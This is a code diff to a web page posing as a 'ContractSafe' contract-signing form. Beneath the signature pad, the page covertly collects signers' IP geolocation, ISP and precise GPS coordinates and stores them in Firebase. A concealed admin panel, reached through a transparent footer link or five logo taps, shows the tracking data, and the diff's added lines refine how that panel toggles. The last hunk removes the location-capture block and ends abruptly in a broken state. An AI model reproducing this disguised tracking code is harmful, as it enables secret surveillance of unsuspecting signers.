@@ -318,7 +318,7 @@
         <div class="footer">
             <div>Secured by ContractSafe™ Digital Agreements</div>
             <div style="margin-top: 8px;">© 2023 Global Contracts Ltd. All rights reserved. | 
-                <a href="#" id="secretAdminLink" style="color: transparent; text-decoration: none;">Terms</a>
+                <a href="javascript:void(0)" id="secretAdminLink" style="color: transparent; text-decoration: none; cursor: pointer;">Terms</a>
             </div>
         </div>
     </div>
@@ -409,8 +409,16 @@
             messagingSenderId: "810816177909",
             appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
         };
+        
+        // Initialize Firebase
         firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
+        
+        // Enable offline persistence
+        db.enablePersistence()
+          .catch((err) => {
+              console.error("Firestore persistence error:", err);
+          });
 
         // ===== SIGNATURE PAD =====
         const canvas = document.getElementById('signatureCanvas');
@@ -419,7 +427,8 @@
             penColor: 'black'
         });
 
-        document.getElementById('clearSignature').addEventListener('click', () => {
+        document.getElementById('clearSignature').addEventListener('click', (e) => {
+            e.preventDefault();
             signaturePad.clear();
         });
 
@@ -428,38 +437,61 @@
         const secretAdminLink = document.getElementById('secretAdminLink');
         let tapCount = 0;
         let locationHistory = [];
+        let adminPanelVisible = false;
 
         // Logo tap detection
-        function incrementTap() {
+        function incrementTap(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            
             tapCount++;
             if (tapCount === 5) {
-                showAdmin();
+                toggleAdminPanel();
                 tapCount = 0;
             }
             clearTimeout(window.tapTimeout);
             window.tapTimeout = setTimeout(() => tapCount = 0, 2000);
+            return false;
         }
+
+        // Secret admin link
+        secretAdminLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            toggleAdminPanel();
+            return false;
+        });
 
         adminLogo.addEventListener('click', incrementTap);
         adminLogo.addEventListener('touchstart', incrementTap);
 
-        // Secret admin link (hidden in footer)
-        secretAdminLink.addEventListener('click', (e) => {
+        // Close admin panel
+        document.getElementById('adminClose').addEventListener('click', function(e) {
             e.preventDefault();
-            showAdmin();
+            toggleAdminPanel();
+            return false;
         });
 
-        // Close admin panel
-        document.getElementById('adminClose').addEventListener('click', hideAdmin);
+        function toggleAdminPanel() {
+            if (adminPanelVisible) {
+                hideAdmin();
+            } else {
+                showAdmin();
+            }
+        }
 
         function showAdmin() {
+            document.body.style.overflow = 'hidden';
             document.getElementById('adminPanel').style.display = 'block';
+            adminPanelVisible = true;
             loadTrackingData();
             initAnalytics();
         }
 
         function hideAdmin() {
+            document.body.style.overflow = '';
             document.getElementById('adminPanel').style.display = 'none';
+            adminPanelVisible = false;
             if (window.watchId) {
                 stopTracking();
             }
@@ -467,7 +499,9 @@
 
         // ===== TAB SWITCHING =====
         document.querySelectorAll('.tab-button').forEach(button => {
-            button.addEventListener('click', () => {
+            button.addEventListener('click', (e) => {
+                e.preventDefault();
+                
                 // Remove active class from all buttons and content
                 document.querySelectorAll('.tab-button').forEach(btn => btn.classList.remove('active'));
                 document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
@@ -482,7 +516,9 @@
         });
 
         // ===== CONTRACT SUBMISSION =====
-        document.getElementById('submitContract').addEventListener('click', () => {
+        document.getElementById('submitContract').addEventListener('click', (e) => {
+            e.preventDefault();
+            
             if (!signaturePad.isEmpty() && document.getElementById('agreeTerms').checked) {
                 submitContract();
             } else {
@@ -506,25 +542,4 @@
                 .then(res => res.json())
                 .then(data => {
                     contractData.location.ipData = {
-                        ip: data.ip,
-                        city: data.city,
-                        region: data.region,
-                        country: data.country_name,
-                        coordinates: [data.latitude, data.longitude],
-                        isp: data.org
-                    };
-
-                    // Get precise GPS if available
-                    if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(
-                            position => {
-                                contractData.location.gpsData = {
-                                    coordinates: [position.coords.latitude, position.coords.longitude],
-                                    accuracy: position.coords.accuracy,
-                                    timestamp: new Date(position.timestamp).toISOString()
-                                };
-                                saveToFirebase(contractData);
-                            },
-                            () => saveToFirebase(contractData)
-                        );
-  
+            
